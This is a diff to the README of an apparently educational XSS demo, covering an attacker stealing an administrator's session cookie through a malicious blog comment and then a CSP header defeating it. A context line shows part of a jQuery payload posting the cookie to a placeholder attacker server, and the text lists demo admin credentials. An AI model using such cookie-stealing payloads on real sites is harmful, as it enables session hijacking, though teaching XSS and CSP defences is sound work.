@@ -177,7 +177,9 @@ along with the port 8000 (where the hacker_server is running).
 Then go to the *XSS Demo* site (for this the Administrator has to tell you the
 IP address of his machine).
 
+```
 http://<BLOG-IP>:6543
+```
 
 Open any of the blog post and post a comment with following content:
 
@@ -189,16 +191,16 @@ $.post('http://<HACKER-SERVER-IP>:8000/cookie', {username: 'Administrator', cook
 ```
 
 If both the site and the *hacker server* are running on your machine you can
-use **localhost* as IP address in both cases.
+use **localhost** as IP address in both cases.
 
 
 ### 2. Administrator
 
 The administrator logs into the application:
 
-http://localhost:6543/login
-Username: administrator
-Password: top-secret
+http://localhost:6543/login  
+Username: administrator  
+Password: top-secret  
 
 You can check that you are correctly logged in by creating a new blog post. You
 can see the cookie created by the application in yours browsers Developer
@@ -208,9 +210,8 @@ will be able to execute all administrator actions (such as creating a new blog
 post). That is why the cookie needs to be kept secret. We will see how the
 attacker can steal the cookie using XSS.
 
-Now navigate to the blogpost that the attacker compromised (by adding an
-*infected* comment). Thats it! The attacker has received your cookie and you
-didn't even notice.
+Now navigate to the blogpost that the attacker compromised. Thats it! The
+attacker has received your cookie and you didn't even notice.
 
 
 ### 3. Attacker
@@ -310,9 +311,15 @@ will work.
 
 Reload the server and try the cookie stealing attack from above. It will fail.
 
-Ideally you should strive to remove *unsafe-inline* from the CSP header because
-then you are a lot safer from XSS attacks (even if you have XSS vulnerabilities
-in the application).
+Ideally you should strive to remove *'unsafe-inline'* from the CSP header
+because then you are a lot safer from XSS attacks (even if you have XSS
+vulnerabilities in the application). But even as it is (with *'unsafe-inline'*
+allowed) the attack didn't work because we are blocking AJAX connections to
+other servers that are not *'self'*.
+
+You can see the header set by the browser by examining the Network traffic in
+your browsers Developer Console or by examining the **_add_csp_header** and
+**_add_csp_header_hard** functions in **app/xss_demo/views.py**.
 
 
 Links & Acknowledgements
